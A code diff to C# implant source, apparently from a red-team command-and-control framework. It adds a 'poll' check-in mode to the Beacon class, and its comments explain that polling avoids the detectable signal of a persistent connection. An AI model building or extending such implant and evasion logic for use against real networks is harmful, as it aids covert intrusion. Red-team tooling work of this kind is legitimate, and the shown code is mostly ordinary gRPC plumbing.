@@ -27,6 +27,13 @@ namespace Rod.Implant.Internal;
 /// </summary>
 internal sealed class Beacon
 {
+    // How one check-in cycle uses the stream. Stream holds the connection open
+    // for the life of the session -- the interactive shape, server-push
+    // tasking with no reconnect cost. Poll drains queued tasking, closes the
+    // stream, and sleeps the beacon interval: the low-and-slow shape, where a
+    // persistent connection would be the loudest signal an implant emits.
+    // Both ride the same stream contract; only the client's use of it differs.
+    private readonly string _mode;
     private readonly string _beaconUrl;
     private readonly string _implantId;
     private readonly X509Certificate2 _leaf;
@@ -51,6 +58,19 @@ internal sealed class Beacon
     }
 
     /// <summary>
+    /// Builds a Beacon with an explicit check-in mode ("stream" or "poll"; the
+    /// baked profile or the -mode flag decides). See the field comment for what
+    /// each mode trades.
+    /// </summary>
+    public Beacon(string mode, string beaconUrl, string implantId, X509Certificate2 leaf, RSA privateKey,
+        IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
+        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
+        : this(beaconUrl, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log)
+    {
+        _mode = mode;
+    }
+
+    /// <summary>
     /// Builds a Beacon whose lateral.move handler can derive a child using
     /// <paramref name="enroll"/> (architecture.md Sec 10.1). A null bundle leaves
     /// derivation disabled. <paramref name="classVerbs"/> is the baked class
@@ -60,6 +80,7 @@ internal sealed class Beacon
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
     {
+        _mode = BeaconModes.Stream;
         _beaconUrl = beaconUrl;
         _implantId = implantId;
         _leaf = leaf;
@@ -199,8 +220,11 @@ internal sealed class Beacon
         }
         _log.WriteLine($"handshake ok: engagement={hs.EngagementId}");
 
-        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
-        while (await call.ResponseStream.MoveNext(cancellationToken))
+        // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
+        // up. Stream mode blocks until the server closes; poll mode drains the
+        // queue and ends the cycle on a short idle window (below), so the
+        // implant can sleep the beacon interval instead of holding a line open.
+        while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
         {
             var frame = call.ResponseStream.Current;
             var task = TaskRequest.Parser.ParseFrom(frame.Payload);
@@ -249,7 +273,60 @@ internal sealed class Beacon
             }
         }
 
+        // Poll mode: the queue is drained and the idle window closed the read
+        // loop -- half-close the send side and wait for the server to end the
+        // stream, so every result written above is fully delivered before the
+        // cycle ends and the beacon sleeps.
+        if (IsPoll)
+        {
+            try
+            {
+                await call.RequestStream.CompleteAsync();
+                while (await call.ResponseStream.MoveNext(cancellationToken))
+                {
+                    // Nothing further is expected; drain until the server ends.
+                }
+            }
+            catch (RpcException)
+            {
+                // The server tore the stream down as it processed the
+                // half-close; the results are already upstream.
+            }
+        }
+
         return BeaconCycleResult.Handshaken;
+    }
+
+    // How long a poll-mode read waits for the next downstream frame before
+    // deciding the queue is drained. Well above the server's dispatch poll
+    // interval, so a queued task is not cut in half; a close that races a
+    // dispatch is still safe -- an unclaimed task stays queued, and a task
+    // whose frame write failed is requeued server-side.
+    private static readonly TimeSpan PollIdleWindow = TimeSpan.FromMilliseconds(250);
+
+    private bool IsPoll => _mode == BeaconModes.Poll;
+
+    // One read of the downstream stream: stream mode blocks on the token, poll
+    // mode adds the idle window whose expiry ends the cycle.
+    private async Task<bool> MoveNextFrameAsync(Grpc.Core.IAsyncStreamReader<Frame> stream, CancellationToken cancellationToken)
+    {
+        if (!IsPoll)
+            return await stream.MoveNext(cancellationToken);
+
+        using var idle = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        idle.CancelAfter(PollIdleWindow);
+        try
+        {
+            return await stream.MoveNext(idle.Token);
+        }
+        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
+        {
+            return false;
+        }
+        catch (RpcException) when (idle.IsCancellationRequested && !cancellationToken.IsCancellationRequested)
+        {
+            return false;
+        }
     }
 
     // The failure counter's doubling cap: the reconnect delay grows as
